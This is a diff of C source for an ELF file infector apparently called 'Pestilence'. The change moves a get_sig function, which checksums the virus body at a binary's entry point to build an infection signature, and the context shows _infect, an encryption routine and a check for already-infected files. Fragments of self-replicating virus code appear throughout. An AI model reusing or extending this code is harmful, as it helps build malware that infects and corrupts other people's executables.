@@ -6,6 +6,37 @@
 //char KEY[16];
 #define DATA 0x02
 
+int get_sig(char *s, size_t n, size_t virus_len, char *sig)
+{
+	Elf64_Ehdr *h = (void*)s;
+	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
+	size_t sig_len = slen(sig);
+
+	if (entry + virus_len >= n)
+		return fail("invalid entry point");
+
+	size_t i;
+	size_t sig_sum = 0;;
+
+	for (i = 0; i < virus_len; i++)
+	{
+		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
+			i += sig_len;
+		sig_sum += *(unsigned char*)(s + entry + i);
+	}
+
+	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
+	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
+	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
+	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
+	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
+	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
+	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
+	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';
+
+	return TRUE;
+}
+
 //======================= WOODY ==============================
 
 void encrypt_block(uint32_t* v, uint32_t *k) {
@@ -126,37 +157,6 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 }
 
 //=============================================================
-
-int get_sig(char *s, size_t n, size_t virus_len, char *sig)
-{
-	Elf64_Ehdr *h = (void*)s;
-	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
-	size_t sig_len = slen(sig);
-
-	if (entry + virus_len >= n)
-		return fail("invalid entry point");
-
-	size_t i;
-	size_t sig_sum = 0;;
-
-	for (i = 0; i < virus_len; i++)
-	{
-		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
-			i += sig_len;
-		sig_sum += *(unsigned char*)(s + entry + i);
-	}
-
-	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
-	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
-	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
-	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
-	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
-	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
-	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
-	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';
-
-	return TRUE;
-}
 
 int check_already_packed(char *s, size_t n, size_t virus_len){
 	char sig[] = "Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA";
